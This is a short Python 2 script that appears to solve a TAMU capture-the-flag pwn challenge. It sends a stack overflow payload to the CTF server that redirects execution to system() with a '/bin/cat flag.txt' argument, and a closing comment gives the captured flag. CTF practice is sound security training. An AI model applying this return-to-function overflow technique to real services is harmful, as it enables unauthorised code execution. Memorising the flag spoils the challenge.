#!/usr/bin/env python2
from struct import pack
import socket

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r.connect(('web.ctf.tamu.edu', 4324))

def p(data):
	return pack("<I",data)

flag = 0x0804a028 # from .data "/bin/cat flag.txt"
system = 0x80484d9 # from flag_func()

payload = "A"*16
payload += p(system)
payload += p(flag)
payload += "JUNK"

r.send(payload + "\n")
print r.recv(1024)
r.close()

#gigem{R3TURN_0R13NT3D_PR0F1T}
